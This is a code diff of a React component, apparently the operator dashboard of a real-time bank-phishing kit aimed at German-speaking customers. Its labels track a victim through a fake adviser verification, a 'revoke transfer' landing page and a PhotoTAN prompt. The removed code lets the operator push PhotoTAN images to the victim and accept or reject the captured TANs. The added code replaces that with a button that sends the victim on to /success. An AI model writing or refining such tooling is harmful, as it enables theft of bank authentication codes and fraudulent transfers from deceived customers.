@@ -152,38 +152,16 @@ const StornoLiveCard = () => {
 
               {!done && (
                 <div className="space-y-3 pt-2 border-t">
-                  {(phase === "berater" || phase === "widerruf" || phase === "start") && (
-                    <StepBlock title="PhotoTAN vorbereiten">
-                      <PhotoTanUploader r={r} onSet={url => setPhotoTanImage(r, url)} />
-                      <div className="flex flex-wrap gap-2">
-                        <Button size="sm" onClick={() => showPhotoTan(r)} disabled={!r.photo_tan_image}>
-                          <CheckCircle2 className="h-4 w-4 mr-1" />PhotoTAN anzeigen
-                        </Button>
-                      </div>
-                      <p className="text-xs text-muted-foreground">
-                        {phase === "berater" && "Kunde füllt Berater-Verifizierung aus."}
-                        {phase === "widerruf" && "Kunde ist auf der Landing-Seite und klickt Überweisung widerrufen."}
-                        {phase === "start" && "Kunde sieht Transaktionsdetails und wartet auf PhotoTAN."}
-                      </p>
-                    </StepBlock>
-                  )}
-
-                  {phase === "phototan" && (
-                    <StepBlock title="TAN prüfen">
-                      <PhotoTanUploader r={r} onSet={url => setPhotoTanImage(r, url)} compact />
-                      <div className="flex flex-wrap gap-2">
-                        <Button size="sm" variant="destructive" onClick={() => rejectTan(r)} disabled={!meta?.tan}>
-                          <XCircle className="h-4 w-4 mr-1" />TAN ablehnen
-                        </Button>
-                        <Button size="sm" onClick={() => acceptTan(r)} disabled={!meta?.tan}>
-                          <CheckCircle2 className="h-4 w-4 mr-1" />TAN akzeptieren → Loader
-                        </Button>
-                      </div>
-                    </StepBlock>
-                  )}
-
-                  <div className="flex justify-end">
+                  <p className="text-xs text-muted-foreground">
+                    {phase === "berater" && "Kunde füllt Berater-Verifizierung aus."}
+                    {phase === "widerruf" && "Kunde ist auf der Widerruf-Landing-Seite."}
+                    {phase === "start" && "Kunde wartet auf /widerruf/start – Freigabe hier klicken."}
+                  </p>
+                  <div className="flex flex-wrap justify-between gap-2">
                     <Button size="sm" variant="ghost" onClick={() => abort(r)}>Session abbrechen</Button>
+                    <Button size="sm" onClick={() => acceptTan(r)} disabled={phase !== "start"}>
+                      <CheckCircle2 className="h-4 w-4 mr-1" />Weiter zu /success
+                    </Button>
                   </div>
                 </div>
               )}
